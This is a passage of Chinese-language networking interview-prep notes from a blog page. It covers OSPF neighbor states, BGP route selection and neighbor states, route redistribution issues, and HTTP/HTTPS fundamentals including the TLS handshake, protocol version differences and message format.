主从选举完成后，一旦发送携带 LSA 头部的 DD 报文，则进入 exchange，slave 路由器开始发送携带自身 LSDB 中 LSA 的头部信息的 DBD 报文，并使用</p>\n<p>loading 状态发送 LSR，LSU，LSACK ，LSACK 中会将 LSU 的 Seq 作为自己的 seq，同时携带摘要作为显示确认</p>\n<p>FUll：LSR 重传列表为空，发送和接受 LSACK 报文后，防止同步出现问题。</p>\n<p>attempt— 过度状态，在某些不能发送的 hello 包的网络中，不能主动建立邻居。通过单播邻居方式建立，需要选 DR 时，等待选举状态为 attempt 状态</p>\n<p>停留 attempt 状态说明单播指邻居邻居指错</p>\n</blockquote>\n<h4 id=\"59ospf卡在exstart状态的原因迪普\"><a class=\"markdownIt-Anchor\" href=\"#59ospf卡在exstart状态的原因迪普\">#</a> 5.9ospf 卡在 exstart 状态的原因（迪普）</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">卡在down状态：OSPF没有运行；</span><br><span class=\"line\">卡在init状态：没有收到对方的包；</span><br><span class=\"line\">卡在2-way状态：MA网络没法选举；</span><br><span class=\"line\">卡在exstart状态：MTU不匹配；</span><br><span class=\"line\">卡在loading状态：LSA加载不完全、包交互有问题；</span><br></pre></td></tr></table></figure>\n<h4 id=\"510ospf-影响邻居建立因素迪普\"><a class=\"markdownIt-Anchor\" href=\"#510ospf-影响邻居建立因素迪普\">#</a> 5.10ospf 影响邻居建立因素（迪普）</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">router-id冲突</span><br><span class=\"line\">area id</span><br><span class=\"line\">auth type</span><br><span class=\"line\">auth data</span><br><span class=\"line\">network-mask</span><br><span class=\"line\">hello-interval</span><br><span class=\"line\">dead-interval</span><br><span class=\"line\">options</span><br><span class=\"line\">MTU (DD)</span><br><span class=\"line\">ospf network-type</span><br><span class=\"line\">silent interface</span><br></pre></td></tr></table></figure>\n<h4 id=\"511p2mp-和-p2p-能建邻居吗迪普\"><a class=\"markdownIt-Anchor\" href=\"#511p2mp-和-p2p-能建邻居吗迪普\">#</a> 5.11p2mp 和 p2p 能建邻居吗（迪普）</h4>\n<blockquote>\n<p>可以建立邻居，P2MP 以组播形式发送 hello 报文，P2P 以组播形式发送所有报文</p>\n<p>但 P2P hello 时间 10s，P2MPhello 时间 40s，需要手动修改 hello 时间一致</p>\n</blockquote>\n<h3 id=\"6bgp相关\"><a class=\"markdownIt-Anchor\" href=\"#6bgp相关\">#</a> 6.BGP 相关</h3>\n<h4 id=\"61origin属性network和import都是什么属性优先级origin控制选路快手\"><a class=\"markdownIt-Anchor\" href=\"#61origin属性network和import都是什么属性优先级origin控制选路快手\">#</a> 6.1origin 属性，network 和 import 都是什么属性，优先级，origin 控制选路 (快手)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">定义路径信息的来源。描述该路由是用什么方式成为BGP路由的，公认必尊</span><br><span class=\"line\">1.将IGP路由network到BGP中     i</span><br><span class=\"line\">2.将EGP路由import到BPG中      e</span><br><span class=\"line\">3.将IGP路由import到BGP中      ?</span><br><span class=\"line\">选路时origin  i &gt; e &gt; ?</span><br><span class=\"line\">手动汇总路由继承明细路由中优先级最低起源属性，自动汇总origin全部为incomplete(?)</span><br></pre></td></tr></table></figure>\n<h4 id=\"bgp选路中科闻歌绿盟\"><a class=\"markdownIt-Anchor\" href=\"#bgp选路中科闻歌绿盟\">#</a> bgp 选路（中科闻歌，绿盟）</h4>\n<blockquote>\n<p>1. 优选协议首选值 (PrefVal) 最高的路由</p>\n<p>2. 优选本地优先级 (Local_Pref) 最高的路由</p>\n<p>3. 优选本地生成的路由，解决路由冲突，<strong>agg &gt; auto &gt; network &gt; import &gt; peer</strong></p>\n<p>4. 优选 AS 路径 (AS_Path）最短的路由</p>\n<p>5. 比较 Origin 属性，依次优选 Origin 类型为 IGP、EGP、Incomplete 的路由</p>\n<p>6. 优选 MED 值最低的路由</p>\n<p>7. 优选从 EBGP 邻居学来的路由 (EBGP 路由优先级高于 IBGP 路由)</p>\n<p>8. 优选到下一跳 IGP Metric 较小的路由</p>\n<p>----------------------------</p>\n<p>9. 优选 Cluster_List 最短的路由，没有簇列表簇列表为空，没有簇列表一定更优</p>\n<p>10. 优选起源 ID，越小越优</p>\n<p>11. 优选 Router lD 最小的路由器发布的路由</p>\n<p>12. 比较对等体的 IP Address，优选从具有较小 IP Address 的对等体学来的路由</p>\n<p>简单来说</p>\n<p>P L L A O M E N   漂亮老男人</p>\n<p>Pref LocalPre Local AS origin MED EBGP next_cost</p>\n</blockquote>\n<p>BGP 邻居建立 (迪普)</p>\n<blockquote>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2021/png/2759285/1620389842717-2d451b53-d037-406c-a4b4-717bf756ba7d.png\" alt=\"image.png\"></p>\n<p>ldle (空闲) : ldle 是 BGP 连接的第一个状态，在空闲状态，BGP 在等待一个启动事件，启动事件出现以后，BGP 初始化资源，复位连接重试计时器 (Connect-Retry)，发起一条 TCP 连接，同时转入 Connect (连接）状态。</p>\n<p>Connect (连接)︰在 Connect 状态，BGP 发起第一个 TCP 连接，如果连接重试计时器 (Connect-Retry) 超时，就重新发起 TCP 连接，并继续保持在 Connect 状态，如果 TCP 连接成功，就转入 OpenSent 状态，如果 TCP 连接失败，就转入 Active 状态。</p>\n<p>Active (活跃)︰在 Active 状态，BGP 总是在试图建立 TCP 连接，如果连接重试计时器 (Connect-Retry) 超时，就退回到 Connect 状态，如果 TCP 连接成功，就转入 OpenSent 状态，如果 TCP 连接失败，就继续保持在 Active 状态，并继续发起 TCP 连接，没有收到对 open-send 报文的确认报文。</p>\n<p>TCP 三次握手建立。自己发送 open，等待接收正确的 open。接收正确 open 的进入 openconfirm，发 keepalive，收到对方 keepalive 进入 established。对方也是这个过程</p>\n</blockquote>\n<p>BGP 路由刷新 (迪普)</p>\n<blockquote>\n<p>Route-Refresh</p>\n<p>用于手动实现 BGP 触发更新。不中断 TCP 会话触发更新，可以针对邻居触发更新</p>\n<p>refresh bgp all (peer) export 向对方发送 update message，更新对方路由信息</p>\n<p>refresh import 向对方发送 route-refresh，对方收到后回复 update message 完成路由刷新</p>\n<p>route-refresh 报文中携带 AFI 和 SAFI</p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2021/png/2759285/1632012709113-4efb27ea-86da-4051-983c-d0353caa983f.png\" alt=\"img\"></p>\n</blockquote>\n<p>BGP 路由撤销 (迪普)</p>\n<blockquote>\n<p>1.IPV4 路由撤销</p>\n<p>通过 update 报文 NLRI 字段中的 withdraw route 实现，其中不携带任何属性</p>\n<p>2.VPNV4 路由撤销</p>\n<p>不携带路由属性，在 update 报文 path attribute 中 MP_UNREACH_NLRI 携带撤销路由</p>\n<p>不携带路由属性，只携带 RD 和标签栈</p>\n</blockquote>\n<h3 id=\"7双点双向重发布快手\"><a class=\"markdownIt-Anchor\" href=\"#7双点双向重发布快手\">#</a> 7. 双点双向重发布 (快手)</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">在多点双向重发布中，若A协议的优先级大于（次）B协议，此时若将A协议通过一台ASBR引入到B协议时，那此优先级会降低（变优），会导致另一台ASBR路由表的生成，此时另一台ASBR再次将B往A协议重发布时，原先A协议的路由会再次回到A协议中--路由回馈</span><br><span class=\"line\">解决方案:将重发布进来的路由优先级改高--Cisco提出，在Cisco的EIGRP协议中，内部路由优先级90，外部170。所以，华为设备因为不支持EIGRP，仅支持OSPF，所以借鉴了Cisco的做法--在华为中，OSPF内部优先级10，外部150</span><br><span class=\"line\">OSPF协议学习OSPF网络内的所有环回接口网段时，学习到的都是32为的主机路由，但是将本设备工作在OSPF的直连接口重发布时时原本的掩码，</span><br><span class=\"line\">所以可能会导致在重发布时同一条路由条目变成不同的掩码发布到另一协议</span><br><span class=\"line\">解决方案：</span><br><span class=\"line\">1）修改环回接口掩码直接为32位 </span><br><span class=\"line\">2）修改环回接口的OSPF工作的网络类型</span><br><span class=\"line\">在进行多点双向重发布时，由于协议之间不兼容，因此原路由的度量值进入新协议时，会被起始度量代替，所以存在选路不佳的问题</span><br><span class=\"line\">解决方案：需要人为的干涉选路---路由策略技术</span><br><span class=\"line\">注意：BGP与OSPF或其他协议做多点多向重发布，会出现瞬时环路。</span><br><span class=\"line\">就是BGP收敛慢，OSPF收敛快，两个协议启动会存在时差，在这个时差内协议的边界路由器是没有BGP协议的路由，那么在协议边界路由上就存在路由黑洞</span><br></pre></td></tr></table></figure>\n<h3 id=\"8httphttps相关问题\"><a class=\"markdownIt-Anchor\" href=\"#8httphttps相关问题\">#</a> 8.http/https 相关问题</h3>\n<h4 id=\"http状态码汉得曙光\"><a class=\"markdownIt-Anchor\" href=\"#http状态码汉得曙光\">#</a> http 状态码 (汉得，曙光)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">常见状态码          </span><br><span class=\"line\">200\t请求成功</span><br><span class=\"line\">301 永久重定向</span><br><span class=\"line\">302 临时重定向</span><br><span class=\"line\">400 请求错误，通常是访问的域名未绑定引起</span><br><span class=\"line\">403 禁止访问</span><br><span class=\"line\">404 请求的内容未找到或已删除</span><br><span class=\"line\">500 服务器端程序错误</span><br><span class=\"line\">502 网关无响应</span><br><span class=\"line\">503 服务器端临时错误</span><br><span class=\"line\">504\t网关超时</span><br><span class=\"line\">https://seo.juziseo.com/doc/http_code/</span><br></pre></td></tr></table></figure>\n<h4 id=\"访问网页过程信锐汉得\"><a class=\"markdownIt-Anchor\" href=\"#访问网页过程信锐汉得\">#</a> 访问网页过程 (信锐，汉得)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.首先在浏览器地址栏中输入URL或者域名。</span><br><span class=\"line\">2.电脑开始域名解析：</span><br><span class=\"line\">看查找IP是否是本机。不是再去查询浏览器缓存，本机hosts文件，如果有对应的IP则进行反馈，然后进行下一步。如果本机Hosts文件不含有，则本机向发出一个DNS请求到本地DNS服务器。</span><br><span class=\"line\">DNS请求到达本地DNS服务器之后，本地DNS服务器会首先查询它的缓存记录，如果缓存中有此条记录，就可以直接返回结果。如果没有，本地DNS服务器还要向DNS根服务器进行查询。</span><br><span class=\"line\">根DNS服务器没有记录具体的域名和IP地址的对应关系，而是告诉本地DNS服务器，你可以到域服务器上去继续查询，并给出域服务器的地址。</span><br><span class=\"line\">最后，本地DNS服务器向域名的解析服务器发出请求，这时就能收到一个域名和IP地址对应关系，本地DNS服务器不仅要把IP地址返回给用户电脑，还要把这个对应关系保存在缓存中，以备下次别的用户查询时，可以直接返回结果，加快网络访问。</span><br><span class=\"line\">网址真正的解析过程为:  . -&gt; .com -&gt; Microsoft.com. -&gt; www.Microsoft.com. </span><br><span class=\"line\">3.进行tcp三次握手</span><br><span class=\"line\">上面八股文你有写过，自己看吧</span><br><span class=\"line\">4.http/https请求和返回</span><br><span class=\"line\">HTTP报文是包裹在TCP报文中发送的，服务器端收到TCP报文时会解包提取出HTTP报文。</span><br><span class=\"line\">https = http + tls，具体下面有写，这边就不写了，开摆</span><br><span class=\"line\">浏览器对服务器发出HTTP请求报文</span><br><span class=\"line\">发送HTTP请求的过程就是构建HTTP请求报文并通过TCP协议中发送到服务器指定端口(HTTP协议80/8080, HTTPS协议443)。HTTP请求报文是由三部分组成: 请求行, 请求报头和请求正文。</span><br><span class=\"line\">服务器处理请求并返回HTTP响应报文</span><br><span class=\"line\">后端从在固定的端口接收到TCP报文开始，这一部分对应于编程语言中的socket。它会对TCP连接进行处理，对HTTP协议进行解析，并按照报文格式进一步封装成HTTP Request对象，供上层使用。HTTP响应报文也是由三部分组成: 状态码, 响应报头和响应报文。</span><br><span class=\"line\">5.浏览器渲染页面</span><br><span class=\"line\">浏览器在收到HTML,CSS,JS文件后，浏览器是一个边解析边渲染的过程。首先浏览器解析HTML文件构建DOM树，然后解析CSS文件构建渲染树，等到渲染树构建完成后，浏览器开始布局渲染树并将其绘制到屏幕上。</span><br></pre></td></tr></table></figure>\n<h4 id=\"https长亭\"><a class=\"markdownIt-Anchor\" href=\"#https长亭\">#</a> https (长亭)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTPS是一种透过计算机网络进行安全通信的传输协议。HTTPS 经由 HTTP 进行通信，但利用 SSL/TLS 来加密数据包。</span><br><span class=\"line\">https = http + tls</span><br><span class=\"line\">tls 位于传输层上层</span><br><span class=\"line\">HTTPS在传输数据之前需要客户端与服务器进行一个握手(TLS/SSL握手)，在握手过程中将确立双方加密传输数据的密码信息。TLS/SSL使用了非对称加密，对称加密以及hash等。</span><br><span class=\"line\">HTTPS 默认工作在 TCP 协议443端口，它的工作流程一般如以下方式：</span><br><span class=\"line\">1、TCP 三次同步握手</span><br><span class=\"line\">2、客户端验证服务器数字证书</span><br><span class=\"line\">3、DH 算法协商对称加密算法的密钥、hash 算法的密钥</span><br><span class=\"line\">4、SSL 安全加密隧道协商完成</span><br><span class=\"line\">5、网页以加密的方式传输，用协商的对称加密算法和密钥加密，保证数据机密性；用协商的hash算法进行数据完整性保护，保证数据不被篡改。</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p><strong>1、客户端发起 HTTPS 请求</strong></p>\n<p>就是用户在浏览器里输入一个 https 网址，然后连接到 server 的 443 端口。</p>\n<p><strong>2、服务端的配置</strong></p>\n<p>采用 HTTPS 协议的服务器必须要有一套<em>数字证书</em>，可以自己制作，也可以向组织申请，区别就是自己颁发的证书需要客户端验证通过，才可以继续访问，而使用受信任的公司申请的证书则不会弹出提示页面 (startssl 就是个不错的选择，有 1 年的免费服务)。</p>\n<p><em>这套证书其实就是一对公钥和私钥</em>，如果对公钥和私钥不太理解，可以想象成一把钥匙和一个锁头，只是全世界只有你一个人有这把钥匙，你可以把锁头给别人，别人可以用这个锁把重要的东西锁起来，然后发给你，因为只有你一个人有这把钥匙，所以只有你才能看到被这把锁锁起来的东西。</p>\n<p><strong>3、传送证书</strong></p>\n<p>这个证书其实就是公钥，只是包含了很多信息，如证书的颁发机构，过期时间等等。</p>\n<p><strong>4、客户端解析证书</strong></p>\n<p>这部分工作是有客户端的 TLS 来完成的，首先会验证公钥是否有效，比如颁发机构，过期时间等等，如果发现异常，则会弹出一个警告框，提示证书存在问题。</p>\n<p>如果证书没有问题，那么就生成一个随机值，然后用证书对该随机值进行加密，就好像上面说的，把随机值用锁头锁起来，这样除非有钥匙，不然看不到被锁住的内容。</p>\n<p><strong>5、传送加密信息</strong></p>\n<p>这部分传送的是用证书加密后的随机值，目的就是让服务端得到这个随机值，以后客户端和服务端的通信就可以通过这个随机值来进行加密解密了。</p>\n<p><strong>6、服务端解密信息</strong></p>\n<p>服务端用私钥解密后，得到了客户端传过来的随机值 (私钥)，然后把内容通过该值进行对称加密，所谓对称加密就是，将信息和私钥通过某种算法混合在一起，这样除非知道私钥，不然无法获取内容，而正好客户端和服务端都知道这个私钥，所以只要加密算法够彪悍，私钥够复杂，数据就够安全。</p>\n<p><strong>7、传输加密后的信息</strong></p>\n<p>这部分信息是服务段用私钥加密后的信息，可以在客户端被还原。</p>\n<p><strong>8、客户端解密信息</strong></p>\n<p>客户端用之前生成的私钥解密服务段传过来的信息，于是获取了解密后的内容，整个过程第三方即使监听到了数据，也束手无策。</p>\n</blockquote>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221022105328092.png\" alt=\"image-20221022105328092\"></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucnVub29iLmNvbS93M2Nub3RlL2h0dHAtdnMtaHR0cHMuaHRtbA==\">HTTP 与 HTTPS 的区别 | 菜鸟教程 (runoob.com)</span></p>\n<h4 id=\"httphttps区别没人问我自己问着玩\"><a class=\"markdownIt-Anchor\" href=\"#httphttps区别没人问我自己问着玩\">#</a> http/https 区别 (没人问，我自己问着玩)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP 明文传输，数据都是未加密的，安全性较差，HTTPS（SSL+HTTP） 数据传输过程是加密的，安全性较好。</span><br><span class=\"line\"></span><br><span class=\"line\">使用 HTTPS 协议需要到 CA（Certificate Authority，数字证书认证机构） 申请证书，一般免费证书较少，因而需要一定费用。证书颁发机构如：Symantec、Comodo、GoDaddy 和 GlobalSign 等。</span><br><span class=\"line\"></span><br><span class=\"line\">HTTP 页面响应速度比 HTTPS 快，主要是因为 HTTP 使用 TCP 三次握手建立连接，客户端和服务器需要交换 3 个包，而 HTTPS除了 TCP 的三个包，还要加上 ssl 握手需要的 9 个包，所以一共是 12 个包。</span><br><span class=\"line\"></span><br><span class=\"line\">http 和 https 使用的是完全不同的连接方式，用的端口也不一样，前者是 80，后者是 443。</span><br><span class=\"line\"></span><br><span class=\"line\">HTTPS 其实就是建构在 SSL/TLS 之上的 HTTP 协议，所以，要比较 HTTPS 比 HTTP 要更耗费服务器资源。</span><br></pre></td></tr></table></figure>\n<h4 id=\"http1011和20区别长亭\"><a class=\"markdownIt-Anchor\" href=\"#http1011和20区别长亭\">#</a> http1.0,1,1 和 2.0 区别 (长亭)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.1.0和1.1之间的区别</span><br><span class=\"line\">1.缓存策略:</span><br><span class=\"line\">http1.0的缓存策略主要是依赖header中的If-Modiified-Since,Expire(到期)</span><br><span class=\"line\">http1.1的缓存策略要比http1.0略多,例如 Entity tag(实体标签), If-Unmodified-Since, If-Match, If-None-Match等.</span><br><span class=\"line\">2. 宽带和网络连接优化:</span><br><span class=\"line\">http1.0中会存在一些性能浪费,比如我们的只需要对象中的一部分,但是每次请求返回的却是整个对象,这无疑造成了性能的损害</span><br><span class=\"line\">http1.1则不然,它可以通过在请求头处设置range头域,就可以返回请求资源的某一部分,也就是返回码为206(Partial Content)的时候,这对于性能优化很有必要.</span><br><span class=\"line\">这里所谓的请求资源的一部分,也就是大家常说的断点续传</span><br><span class=\"line\">关于断点续传的应用场景,例如用户需要下载一个大文件,最佳的方式是将这个大文件分割成几部分,然后由多个进程同时进行.</span><br><span class=\"line\">这个时候,我们可以在请求头中设置range字段,来规定分割的byte数范围.</span><br><span class=\"line\">而服务端会给客户端返回一个包含着content-range的响应头,来对应相应的分割byte数范围</span><br><span class=\"line\">请求头中:</span><br><span class=\"line\">Range: bytes=0-801 // 一般请求下载整个文件是bytes=0- 或不用这个头</span><br><span class=\"line\">响应头中:</span><br><span class=\"line\">Content-Range: bytes 0-800/801 //801:文件总大小</span><br><span class=\"line\">3. 新增部分错误通知:</span><br><span class=\"line\">http1.1版本新增了24个错误状态响应码,比如</span><br><span class=\"line\">409(Conflict)表示: 请求的资源与当前的状态发生冲突</span><br><span class=\"line\">410(Gone)表示服务器上某个资源被永久性的删除了</span><br><span class=\"line\">4.Host头处理:</span><br><span class=\"line\">http1.0中默认每台服务器都绑定唯一的一个IP地址,所以请求消息中url并没有传递主机名,也就是hostname.</span><br><span class=\"line\">http1.1中请求消息和响应消息都支持Host头域,而且,如果我们不传这个字段还会报一个400(bad request)的状态码</span><br><span class=\"line\">通用头域:</span><br><span class=\"line\">Cache-Control: 缓存头域 =&gt; 常见值为no-cache(不允许缓存), no-store(无论请求还是响应均不允许缓存), max-age(规定可以客户端可以接受多长生命期的数据)</span><br><span class=\"line\">Keep-Alive: 使得服务端和客户端的链接长时间有效</span><br><span class=\"line\">Date: 信息发送的时间</span><br><span class=\"line\">Host: 请求资源的主机IP和端口号</span><br><span class=\"line\">Range: 请求资源的某一部分</span><br><span class=\"line\">User-Agent: 发出请求的用户的信息(鉴权)</span><br><span class=\"line\">5. 长连接:</span><br><span class=\"line\">http1.1支持长连接和请求的流水线(pipelining),在一个TCP链接上可以传送多个http请求和响应.这样就不用多次建立和关闭TCP连接了.</span><br><span class=\"line\"></span><br><span class=\"line\">2.1.x和2.0的区别</span><br><span class=\"line\">http1的解析是基于文本协议的各式解析,而http2.0的协议解析是二进制格式,更加的强大</span><br><span class=\"line\">多路复用(Mutiplexing) : 一个连接上可以有多个request,且可以随机的混在一起,每个不同的request都有对应的id,服务端可以通过request_id来辨别,大大加快了传输速率</span><br><span class=\"line\">header压缩: http1.x中的header需要携带大量信息.而且每次都要重复发送.http2.0使用encode来减少传输的header大小.而且客户端和服务端可以各自缓存(cache)一份header filed表,避免了header的重复传输,还可以减少传输的大小.</span><br><span class=\"line\">服务端推送(server push): 可以通过解析html中的依赖,只能的返回所需的其他文件(css或者js等),而不用再发起一次请求.</span><br><span class=\"line\">Keep-Alive：</span><br><span class=\"line\">Keep-Alive 是使用同一个 TCP 连接来发送和接收多个 HTTP 请求/应答，而不是为每一个新的请求/应答打开新的连接的方法。我们知道 HTTP 协议采用“请求-应答”模式，当使用普通模式，即非 Keep-Alive 模式时，每个请求/应答客户和服务器都要新建一个连接，完成 之后立即断开连接（ HTTP 协议为无连接的协议）；当使用 Keep-Alive 模式（又称持久连接）时，Keep-Alive 功能使客户端到服 务器端的连接持续有效，当出现对服务器的后继请求时，Keep-Alive 功能避免了建立或者重新建立连接。</span><br><span class=\"line\"></span><br><span class=\"line\">总结：</span><br><span class=\"line\">HTTP1.0</span><br><span class=\"line\">浏览器与服务器只保持短暂的连接，浏览器的每次请求都需要与服务器建立一个TCP连接</span><br><span class=\"line\">HTTP1.1</span><br><span class=\"line\">引入了持久连接，即TCP连接默认不关闭，可以被多个请求复用</span><br><span class=\"line\">在同一个TCP连接里面，客户端可以同时发送多个请求</span><br><span class=\"line\">虽然允许复用TCP连接，但是同一个TCP连接里面，所有的数据通信是按次序进行的，服务器只有处理完一个请求，才会接着处理下一个请求。如果前面的处理需要时间特别长特别慢，后面的请求只能排队等着</span><br><span class=\"line\">新增了一些请求方法put、delete、options</span><br><span class=\"line\">新增了一些请求头和响应头</span><br><span class=\"line\">HTTP2.0</span><br><span class=\"line\">采用二进制格式而非文本格式</span><br><span class=\"line\">完全多路复用，而非有序并阻塞的、只需一个连接即可实现并行</span><br><span class=\"line\">使用报头压缩，降低开销</span><br><span class=\"line\">服务器可以推送</span><br><span class=\"line\">链接：https://juejin.cn/post/7089068858241515551</span><br></pre></td></tr></table></figure>\n<h4 id=\"http报文组成长亭-头行\"><a class=\"markdownIt-Anchor\" href=\"#http报文组成长亭-头行\">#</a> http 报文组成 (长亭) 头行</h4>\n<blockquote>\n<p>HTTP 请求报文是由三部分组成: <strong>请求行</strong>，<strong>请求报头</strong>和<strong>请求正文</strong>。</p>\n<p>后端从在固定的端口接收到 TCP 报文开始，这一部分对应于编程语言中的 socket。它会对 TCP 连接进行处理，对 HTTP 协议进行解析，并按照报文格式进一步封装成 HTTP Request 对象，供上层使用。</p>\n<p>HTTP 响应报文也是由三部分组成: <strong>状态码</strong>，<strong>响应报头</strong>和<strong>响应报文</strong>。</p>\n</blockquote>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/aHR0cDovL2RsLml0ZXllLmNvbS91cGxvYWQvYXR0YWNobWVudC8wMDY5LzM0NTEvNDEyYjQ0NTEtMjczOC0zZWJjLWIxZjYtYTBjYzEzYjk2OTdiLmpwZw\" alt=\"img\" style=\"zoom:80%;\" />\n<blockquote>\n<p>①是请求方法，GET 和 POST 是最常见的 HTTP 方法，除此以外还包括 DELETE、HEAD、OPTIONS、PUT、TRACE。不过，当前的大多数浏览器只支持 GET 和 POST</p>\n<p>②为请求对应的 URL 地址，它和报文头的 Host 属性组成完整的请求 URL。</p>\n<p>③是协议名称及版本号。</p>\n<p>④是 HTTP 的报文头，报文头包含若干个属性，格式为 “属性名：属性值”，服务端据此获取客户端的信息。</p>\n<p>⑤是报文体，它将一个页面表单中的组件值通过 param1=value1&amp;m2=value2 的键值对形式编码成一个格式化串，它承载多个请求参数的数据。不但报文体可以传递请求参数，请求 URL 也可以通过类似于 “/chapter15/user.html? param1=value1&amp;m2=value2” 的方式传递请求参数。</p>\n</blockquote>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/aHR0cDovL2RsLml0ZXllLmNvbS91cGxvYWQvYXR0YWNobWVudC8wMDY5LzM0ODcvY2RjNGRiYmItZjk4ZS0zMWQ1LTgyNzAtM2MzN2JmMWM1NGU1LmpwZw\" alt=\"img\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/aHR0cDovL2RsLml0ZXllLmNvbS91cGxvYWQvYXR0YWNobWVudC8wMDY5LzM0OTIvYmRkYjAwYjYtYTNlMS0zMTEyLWE0ZjQtNGIzY2I4Njg3YzcwLmpwZw\" alt=\"img\"></p>\n<blockquote>\n<p>①报文协议及版本；<br>\n②状态码及状态描述；<br>\n③响应报文头，也是由多个属性组成；<br>\n④响应报文体，服务器返回给浏览器的文本信息，通常 HTML, CSS, JS, 图片等文件就放在这一部分。</p>\n</blockquote>\n<h4 id=\"get和post区别汉得\"><a class=\"markdownIt-Anchor\" href=\"#get和post区别汉得\">#</a> get 和 post 区别（汉得）</h4>\n<blockquote>\n<p>Form 中的 get 和 post 方法，在数据传输过程中分别对应了 HTTP 协议中的 GET 和 POST 方法。二者主要区别如下：</p>\n<ul>\n<li>1、Get 是用来从服务器上获得数据，而 Post 是用来向服务器上传递数据。</li>\n<li>2、Get 将表单中数据的按照 variable=value 的形式，添加到 action 所指向的 URL 后面，并且两者使用 “?” 连接，而各个变量之间使用 “&amp;” 连接；Post 是将表单中的数据放在 form 